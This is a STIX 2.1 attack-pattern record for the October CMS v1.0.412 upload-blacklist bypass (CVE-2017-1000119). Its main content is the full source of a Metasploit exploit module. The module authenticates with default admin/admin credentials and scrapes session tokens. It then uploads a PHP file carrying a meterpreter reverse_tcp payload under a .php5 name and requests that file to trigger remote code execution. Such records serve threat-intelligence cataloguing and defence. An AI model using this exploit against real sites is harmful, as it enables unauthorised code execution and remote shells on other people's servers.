{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c3c747c3-7037-4390-a21f-399fa0565cda",
    "created": "2024-08-14T17:09:10.920872Z",
    "modified": "2024-08-14T17:09:10.920876Z",
    "name": "October CMS Upload Protection Bypass Code Execution",
    "description": " This module exploits an Authenticated user with permission to upload and manage media contents can upload various files on the server. Application prevents the user from uploading PHP code by checking the file extension. It uses black-list based approach, as seen in octobercms/vendor/october/rain/src/Filesystem/ Definitions.php:blockedExtensions(). This module was tested on October CMS version v1.0.412 on Ubuntu. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/october_upload_bypass_exec.rb",
            "external_id": "october_upload_bypass_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'October CMS Upload Protection Bypass Code Execution',\n      'Description' => %q{\n          This module exploits an Authenticated user with permission to upload and manage media contents can\n          upload various files on the server. Application prevents the user from\n          uploading PHP code by checking the file extension. It uses black-list based\n          approach, as seen in octobercms/vendor/october/rain/src/Filesystem/\n          Definitions.php:blockedExtensions().\n          This module was tested on October CMS version v1.0.412 on Ubuntu.\n      },\n      'Author' =>\n        [\n          'Anti R\u00e4is', # Discovery\n          'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Metasploit Module\n          'SecureLayer7.net' # Metasploit Module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['EDB','41936'],\n          ['URL','https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html'],\n          ['CVE','2017-1000119']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL'     => false,\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n          'ENCODER' => 'php/base64',\n        },\n      'Privileged' => false,\n      'Platform'   => ['php'],\n      'Arch'       => ARCH_PHP,\n      'Targets' =>\n        [\n          [ 'October CMS v1.0.412', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-04-25'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base October CMS directory path\", '/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'admin']),\n        OptString.new('PASSWORD', [ true, \"Password to authenticate with\", 'admin'])\n      ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(uri, 'modules', 'system', 'assets', 'js', 'framework.js')\n      })\n    rescue\n      vprint_error('Unable to access the /assets/js/framework.js file')\n      return CheckCode::Unknown\n    end\n\n    if res && res.code == 200\n      return Exploit::CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def login\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'backend', 'backend', 'auth', 'signin'),\n      'method' => 'GET'\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    /name=\"_session_key\" type=\"hidden\" value=\"(?<session>[A-Za-z0-9\"]+)\">/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine Session Key\") if session.nil?\n\n    /name=\"_token\" type=\"hidden\" value=\"(?<token>[A-Za-z0-9\"]+)\">/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine token\") if token.nil?\n    vprint_good(\"Token for login : #{token}\")\n    vprint_good(\"Session Key for login : #{session}\")\n\n    cookies = res.get_cookies\n    vprint_status('Trying to Login ......')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'backend', 'backend', 'auth', 'signin'),\n      'cookie' => cookies,\n      'vars_post' => Hash[{\n        '_session_key' => session,\n        '_token' => token,\n        'postback' => '1',\n        'login' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }.to_a.shuffle]\n    })\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # if we redirect. then we assume we have authenticated cookie.\n    if res.code == 302\n      print_good(\"Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n      return cookies\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]\")\n    end\n  end\n\n\n  def exploit\n    cookies = login\n\n    evil = \"<?php #{payload.encoded} ?>\"\n    payload_name = \"#{rand_text_alpha(8..13)}.php5\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"/\", content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=\"path\"')\n    post_data.add_part(evil, content_type = 'application/x-php', transfer_encoding = nil, content_disposition = \"form-data; name=\\\"file_data\\\"; filename=\\\"#{payload_name}\")  #payload\n    data = post_data.to_s\n\n    register_files_for_cleanup(payload_name)\n    vprint_status(\"Trying to upload malicious #{payload_name} file ....\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'backend', 'cms', 'media'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'headers' => { 'X-OCTOBER-FILEUPLOAD' => 'MediaManager-manager' },\n      'Connection' => 'close',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    send_request_cgi({\n      'uri' => normalize_uri(uri, 'storage', 'app', 'media', payload_name),\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-25",
    "x_mitre_platforms": [
        "['php']"
    ]
}